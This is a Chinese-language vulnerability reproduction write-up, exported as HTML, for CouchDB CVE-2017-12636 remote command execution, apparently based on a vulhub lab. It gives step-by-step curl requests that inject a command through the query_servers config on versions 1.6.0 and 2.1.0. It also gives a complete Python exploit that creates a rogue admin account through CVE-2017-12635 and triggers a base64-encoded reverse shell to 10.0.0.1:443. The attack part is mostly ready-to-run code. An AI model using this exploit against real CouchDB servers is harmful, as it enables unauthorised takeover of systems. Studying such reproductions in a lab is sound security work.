<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2017-12636couchdb-任意命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-12636</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Couchdb </span><span class="csECDA2D3">任意命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">2017</span><span class="cs9C1B1871">年</span><span class="cs8926E06">11</span><span class="cs9C1B1871">月</span><span class="cs8926E06">15</span><span class="cs9C1B1871">日，</span><span class="cs8926E06">CVE-2017-12635</span><span class="cs9C1B1871">和</span><span class="cs8926E06">CVE-2017-12636</span><span class="cs9C1B1871">披露，</span><span class="cs8926E06">CVE-2017-12636</span><span class="cs9C1B1871">是一个任意命令执行漏洞，我们可以通过</span><span class="cs8926E06">config api</span><span class="cs9C1B1871">修改</span><span class="cs8926E06">couchdb</span><span class="cs9C1B1871">的配置</span><span class="cs9FB05234">query_server</span><span class="cs9C1B1871">，这个配置项在设计、执行</span><span class="cs8926E06">view</span><span class="cs9C1B1871">的时候将被运行。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">小于</span><span class="cs8926E06"> 1.7.0 </span><span class="cs9C1B1871">以及</span><span class="cs8926E06"> </span><span class="cs9C1B1871">小于</span><span class="cs8926E06"> 2.1.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Couchdb 2.x</span><span class="cs9C1B1871">和和</span><span class="cs8926E06">1.x</span><span class="cs9C1B1871">的</span><span class="cs8926E06">API</span><span class="cs9C1B1871">接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是</span><span class="cs8926E06">1.6.0</span><span class="cs9C1B1871">版本，如果你想测试</span><span class="cs8926E06">2.1.0</span><span class="cs9C1B1871">版本，可以启动</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635"><span class="cs4B51D5E4">CVE-2017-12635</span></a></span><span class="cs9C1B1871">附带的环境。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">执行如下命令启动</span><span class="cs8926E06">Couchdb 1.6.0</span><span class="cs9C1B1871">环境：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">启动完成后，访问</span><span class="cs9FB05234">http://www.0-sec.org:5984/</span><span class="cs9C1B1871">即可看到</span><span class="cs8926E06">Couchdb</span><span class="cs9C1B1871">的欢迎页面。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用</span><span class="cs5BEC2C28">CVE-2017-12635</span><span class="cs9C1B1871">先增加一个管理员用户。</span></p><h4 class="cs868C439D">
			<a name="X1ec3f35129a796e367897c28b76f2fc6a24a5ce"><span class="csBF12A472">1.6.0 </span><span class="cs6EDCDAE2">下的说明</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">依次执行如下请求即可触发任意命令执行：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl -X PUT &#39;http://vulhub:vulhub@www.0-sec.org:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -X PUT &#39;http://vulhub:vulhub@www.0-sec.org:5984/vultest&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -X PUT &#39;http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -X POST &#39;http://vulhub:vulhub@www.0-sec.org:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中</span><span class="cs8926E06">,</span><span class="cs9FB05234">vulhub:vulhub</span><span class="cs9C1B1871">为管理员账号密码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第一个请求是添加一个名字为</span><span class="cs9FB05234">cmd</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">query_servers</span><span class="cs9C1B1871">，其值为</span><span class="cs9FB05234">&quot;id &gt;/tmp/success&quot;</span><span class="cs9C1B1871">，这就是我们后面待执行的命令。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二、三个请求是添加一个</span><span class="cs8926E06">Database</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Document</span><span class="cs9C1B1871">，这里添加了后面才能查询。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第四个请求就是在这个</span><span class="cs8926E06">Database</span><span class="cs9C1B1871">里进行查询，因为我将</span><span class="cs8926E06">language</span><span class="cs9C1B1871">设置为</span><span class="cs9FB05234">cmd</span><span class="cs9C1B1871">，这里就会用到我第一步里添加的名为</span><span class="cs9FB05234">cmd</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">query_servers</span><span class="cs9C1B1871">，最后触发命令执行。</span></p><h4 class="cs868C439D">
			<a name="Xc83c9a8580f640f4241501b1ba0d51d40f7500d"><span class="csBF12A472">2.1.0 </span><span class="cs6EDCDAE2">下的说明</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">2.1.0</span><span class="cs9C1B1871">中修改了我上面用到的两个</span><span class="cs8926E06">API</span><span class="cs9C1B1871">，这里需要详细说明一下。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Couchdb 2.x </span><span class="cs9C1B1871">引入了集群，所以修改配置的</span><span class="cs8926E06">API</span><span class="cs9C1B1871">需要增加</span><span class="cs8926E06">node name</span><span class="cs9C1B1871">。这个其实也简单，我们带上账号密码访问</span><span class="cs9FB05234">/_membership</span><span class="cs9C1B1871">即可：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl http://vulhub:vulhub@www.0-sec.org:5984/_membership</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CouchDB/%ef%bc%88CVE-2017-12636%ef%bc%89Couchdb%20%e4%bb%bb%e6%84%8f%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="115" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可见，我们这里只有一个</span><span class="cs8926E06">node</span><span class="cs9C1B1871">，名字是</span><span class="cs9FB05234">nonode@nohost</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，我们修改</span><span class="cs9FB05234">nonode@nohost</span><span class="cs9C1B1871">的配置：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;id &gt;/tmp/success&quot;&#39;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CouchDB/%ef%bc%88CVE-2017-12636%ef%bc%89Couchdb%20%e4%bb%bb%e6%84%8f%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="118" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，与</span><span class="cs8926E06">1.6.0</span><span class="cs9C1B1871">的利用方式相同，我们先增加一个</span><span class="cs8926E06">Database</span><span class="cs9C1B1871">和一个</span><span class="cs8926E06">Document</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl -X PUT &#39;http://vulhub:vulhub@www.0-sec.org:5984/vultest&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">curl -X PUT &#39;http://vulhub:vulhub@www.0-sec.org:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Couchdb 2.x</span><span class="cs9C1B1871">删除了</span><span class="cs9FB05234">_temp_view</span><span class="cs9C1B1871">，所以我们为了触发</span><span class="cs9FB05234">query_servers</span><span class="cs9C1B1871">中定义的命令，需要添加一个</span><span class="cs9FB05234">_view</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl -X PUT http://vulhub:vulhub@www.0-sec.org:5984/vultest/_design/vul -d &#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39; -H &quot;Content-Type: application/json&quot;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">增加</span><span class="cs9FB05234">_view</span><span class="cs9C1B1871">的同时即触发了</span><span class="cs9FB05234">query_servers</span><span class="cs9C1B1871">中的命令。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">修改其中的</span><span class="cs8926E06">target</span><span class="cs9C1B1871">和</span><span class="cs8926E06">command</span><span class="cs9C1B1871">为你的测试机器，然后修改</span><span class="cs8926E06">version</span><span class="cs9C1B1871">为对应的</span><span class="cs8926E06">Couchdb</span><span class="cs9C1B1871">版本（</span><span class="cs8926E06">1</span><span class="cs9C1B1871">或</span><span class="cs8926E06">2</span><span class="cs9C1B1871">），成功反弹</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/CouchDB/%ef%bc%88CVE-2017-12636%ef%bc%89Couchdb%20%e4%bb%bb%e6%84%8f%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="125" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from requests.auth import HTTPBasicAuth</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">target = &#39;http://your-ip:5984&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">command = rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">version = 1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">session = requests.session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session.headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Content-Type&#39;: &#39;application/json&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># session.proxies = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;&nbsp;&nbsp;&#39;http&#39;: &#39;http://127.0.0.1:8085&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session.put(target + &#39;/_users/org.couchdb.user:wooyun&#39;, data=&#39;&#39;&#39;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;type&quot;: &quot;user&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;name&quot;: &quot;wooyun&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;roles&quot;: [&quot;_admin&quot;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;roles&quot;: [],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;password&quot;: &quot;wooyun&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}&#39;&#39;&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">session.auth = HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">command = &quot;bash -c &#39;{echo,%s}|{base64,-d}|{bash,-i}&#39;&quot; % base64.b64encode(command).decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if version == 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session.put(target + (&#39;/_config/query_servers/cmd&#39;), data=json.dumps(command))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;host = session.get(target + &#39;/_membership&#39;).json()[&#39;all_nodes&#39;][0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session.put(target + &#39;/_node/{}/_config/query_servers/cmd&#39;.format(host), data=json.dumps(command))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">session.put(target + &#39;/wooyun&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session.put(target + &#39;/wooyun/test&#39;, data=&#39;{&quot;_id&quot;: &quot;wooyuntest&quot;}&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if version == 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session.post(target + &#39;/wooyun/_temp_view?limit=10&#39;, data=&#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session.put(target + &#39;/wooyun/_design/test&#39;, data=&#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39;)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/couchdb/CVE-2017-12636/</span></p></body>
</html>
